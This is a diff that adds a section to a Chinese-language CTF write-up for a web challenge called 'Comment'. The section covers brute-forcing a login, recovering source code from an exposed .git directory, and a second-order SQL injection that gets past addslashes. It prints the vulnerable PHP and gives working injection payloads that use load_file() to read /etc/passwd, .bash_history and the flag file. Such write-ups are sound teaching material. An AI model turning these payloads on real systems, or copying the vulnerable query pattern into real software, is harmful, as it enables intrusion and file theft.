@@ -218,3 +218,133 @@ payload=?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:4:"test";s:
 绕过限制利用curl读取写入文件:
 
 [https://www.anquanke.com/post/id/98896](https://www.anquanke.com/post/id/98896)
+
+## Comment
+
+登进去发现可以发帖，但是要跳转到登陆页
+
+提示用户名密码。。。。。卡了半天
+
+zhangwei
+
+zhangwei***
+
+burp 爆破下
+
+密码：zhangwei666
+
+然后可以发帖了
+
+此时扫目录还发现了``.git``
+
+GitHacker拿到
+```
+<?php
+include "mysql.php";
+session_start();
+if($_SESSION['login'] != 'yes'){
+    header("Location: ./login.php");
+    die();
+}
+if(isset($_GET['do'])){
+switch ($_GET['do'])
+{
+case 'write':
+    break;
+case 'comment':
+    break;
+default:
+    header("Location: ./index.php");
+}
+}
+else{
+    header("Location: ./index.php");
+}
+?>
+```
+
+但这个显然不是真实的源码。。。。
+
+最后用GitTools恢复了一下
+
+```php
+<?php
+include "mysql.php";
+session_start();
+if($_SESSION['login'] != 'yes'){
+    header("Location: ./login.php");
+    die();
+}
+if(isset($_GET['do'])){
+switch ($_GET['do'])
+{
+case 'write':
+    $category = addslashes($_POST['category']);
+    $title = addslashes($_POST['title']);
+    $content = addslashes($_POST['content']);
+    $sql = "insert into board
+            set category = '$category',
+                title = '$title',
+                content = '$content'";
+    $result = mysql_query($sql);
+    header("Location: ./index.php");
+    break;
+case 'comment':
+    $bo_id = addslashes($_POST['bo_id']);
+    $sql = "select category from board where id='$bo_id'";//这里category二次调用，可以注入
+    $result = mysql_query($sql);
+    $num = mysql_num_rows($result);
+    if($num>0){
+    $category = mysql_fetch_array($result)['category'];
+    $content = addslashes($_POST['content']);
+    $sql = "insert into comment
+            set category = '$category',
+                content = '$content',
+                bo_id = '$bo_id'";//category注入到这里 就可以带select
+    $result = mysql_query($sql);
+    }
+    header("Location: ./comment.php?id=$bo_id");
+    break;
+default:
+    header("Location: ./index.php");
+}
+}
+else{
+    header("Location: ./index.php");
+}
+?>
+root@EDI:~/GitTools/Extractor#
+```
+
+利用addslashes进行转义，可以看到存在很明显sql二次注入
+
+
+poc:
+```
+title=123&category=',content=(select group_concat(database())),/*&content=1
+```
+
+然后评论*/闭合即可
+
+fuzz了半天，想到可以cat .bash_history....
+
+用``load_file()``读文件 读``/etc/passwd``找用户
+
+``select load_file('/home/www/.bash_history')``
+
+可以看到
+```
+cd /tmp/ unzip html.zip rm -f html.zip cp -r html /var/www/ cd /var/www/html/ rm -f .DS_Store service apache2 start
+```
+
+然后读``/tmp/html/.DS_Store``呗
+
+但是这里有个坑点是里面会有不可见字符。。
+
+所以先用``hex``转下码
+
+里面有``flag_8946e1ff1ee3e40f.php``,load一下拿到flag
+
+```
+title=123&category=',content=(select hex(load_file('/tmp/html/flag_8946e1ff1ee3e40f.php'))),/*&content=1
+```
